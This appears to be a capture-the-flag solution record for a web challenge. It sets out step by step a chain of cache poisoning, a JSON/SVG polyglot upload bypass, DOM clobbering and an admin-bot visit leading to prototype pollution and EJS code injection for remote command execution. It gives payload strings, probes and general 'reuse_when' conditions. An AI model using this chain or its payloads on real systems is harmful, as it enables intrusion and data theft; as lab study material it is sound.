all_of: a reverse proxy cache key is reduced to one request-controlled value (workspace) so every /api/...?workspace=<W> GET shares one cache entry
the client JSON parser strips an XSSI/JSON-hijacking prefix before parsing (Angular FetchBackend strips /^\)\]\}',?\n/)
an image-sniffing upload gate accepts a file as image/* while its body is also a parseable JSON object
an admin bot loads the poisoned workspace and the front-end renders an attacker HTML sink with scripting disabled otherwise (CSP script-src self)
any_of: the HTML sink is an Angular bypassSecurityTrustHtml archive block and the script executes from a same-origin srcdoc iframe
the renderer holds the flag and exposes a template engine reachable through a prototype-pollution merge

chain.action: read nginx.conf and note proxy_cache_key "$scheme|$request_method|$representation_id" with representation_id mapped from ?workspace=<24hex>
chain.why: any GET under /api/ carrying a workspace id collides with every other such request, so one endpoint's body can be served as another's

chain.action: build a body that is simultaneously an accepted image and a JSON object: prepend the XSSI prefix " )]}',\n " and put the literal '<!DOCTYPE svg><svg xmlns=...></svg>' inside a JSON string
chain.why: Debian file(1) reports image/svg+xml because of the DOCTYPE/XML token; the app's hasDocumentPreamble() only rejects a first non-space byte of { or [, and the XSSI prefix makes the first non-space ')'; Angular removes the prefix with its XSSI regex and JSON.parses the rest

chain.action: POST the body to /api/media and confirm the server echoes mime image/svg+xml
chain.why: the upload gate is exactly sniffMime() + hasDocumentPreamble(), so a 201 with image/svg+xml proves the polyglot cleared both

chain.action: GET /api/media/raw?id=<asset>&workspace=<W>, then GET /api/workspaces/manifest?workspace=<W> and compare bodies
chain.why: both requests resolve to cache key <W>; the second returns the uploaded JSON manifest instead of the fixed one, confirming the collision before spending a bot visit

chain.action: manifest contains one archive block: packet = base64(JSON {version:'canvas-1', markup, integrity:fnv1a32(markup)}) where markup is an <iframe srcdoc> holding the DOM-clobber <form id=__chromaticBridge> plus <script src=/static/board-compat.js>
chain.why: LegacyBlocks verifies the FNV-1a32 checksum then returns bypassSecurityTrustHtml(markup); scripts inserted straight into innerHTML do not run, but a same-origin srcdoc iframe does and is allowed by script-src 'self'

chain.action: POST /api/report {workspace:W} to send the admin bot to /w/W; board-compat.js reads the clobbered window.__chromaticBridge and fetches endpoint '/api/admin/export-preview' with the bot's same-origin admin cookie
chain.why: the bot's cookie is httpOnly sameSite=Strict and is attached automatically from the same-origin iframe; the fetch body is the base64-decoded payload

chain.action: payload theme.constructor.prototype.outputFunctionName = x;return <cmd>;//, hitting mergeCatalog prototype pollution and EJS 3.1.6 outputFunctionName code injection
chain.why: mergeCatalog keeps the inherited constructor so the string lands on Object.prototype; ejs compiles 'var <name> = __append;' verbatim and the injected return short-circuits with command output

chain.action: board-compat.js POSTs the response text to /api/telemetry/<channel>; attacker GETs /api/telemetry/<channel> for the flag
chain.why: the flag is never returned to the attacker directly by the bot; telemetry is the same-origin side channel

first_confirming_probe.request: upload the XSSI/JSON/SVG polyglot (body starts " )]}',\n " and contains '"svg":"<!DOCTYPE svg><svg xmlns=\"http://www.w3.org/2000/svg\"></svg>"'), then GET /api/media/raw?id=<asset>&workspace=<W> followed by GET /api/workspaces/manifest?workspace=<W>
first_confirming_probe.expected: upload -> 201 {"mime":"image/svg+xml"}; the manifest request returns the uploaded body (starts with )]}',) instead of the fixed 'Untitled workspace' JSON
first_confirming_probe.falsifier: upload -> 415 unsupported image or invalid image signature; or the manifest request returns the normal fixed manifest, meaning the cache key includes the full request_uri

blast_radius: Local harness: one uploaded asset, one poisoned nginx cache entry for workspace <W> (10m, unique per run) and one short-lived telemetry channel. On a shared instance the same chain is RCE as uid renderer and reads /flag via /readflag; it writes no files. Use a fresh random workspace/channel per attempt and never reuse the victim's.

verification.evidence: Local docker compose harness (edge 127.0.0.1:18080): solve_chromatic.py ran all 4 stages - upload 201 image/svg+xml (asset fde9d231...), poisoned manifest cache verified, /api/report accepted, then GET /api/telemetry/<channel> returned {"html":"CSCV2026{...}\n"} and reported FLAG. Recorded through tools/hooks.py; the polyglot is the previously-unresolved raw-body gadget.

reuse_when: an nginx/proxy cache key is built from a single parameter instead of the full URI
an upload/image gate sniffs with file(1) while a downstream JSON parser ignores the content-type
the client parser strips an XSSI prefix or a BOM before JSON.parse
an admin bot visits an attacker-controlled page and the app has a bypassed HTML sink plus a self-hostable script gadget
known_traps: plain '<svg' or '<?xml' inside a JSON string is NOT enough: file(1) still says application/json/text. The token that flips libmagic to image/svg+xml is '<!DOCTYPE svg>' inside the JSON string value while the file begins with the XSSI prefix
the XSSI prefix must match Angular's PI regex /^\)\]\}',?\n/ exactly, i.e. )]}',\n ; a missing newline or comma placement makes Angular's strip fail and JSON.parse throws

hasDocumentPreamble only inspects the first 64 bytes and only rejects a first non-space of { or [; the XSSI prefix passes it, but a plain JSON object starting with { is rejected - do not drop the prefix
scripts inserted through [innerHTML]/bypassSecurityTrustHtml do not execute; the markup must load board-compat.js from a same-origin <iframe srcdoc> so CSP script-src 'self' allows it
the archive packet is only accepted when integrity == FNV-1a32(markup) as 8 lowercase hex; recompute it over the exact markup bytes
if the deployed ADMIN_TOKEN was rotated, the fast path (POST /api/admin/export-preview with the token) returns 403 and this bot chain is the only route
the XML mime detection depends on the host's libmagic build; verify `file --brief --mime-type <polyglot>` == image/svg+xml before uploading
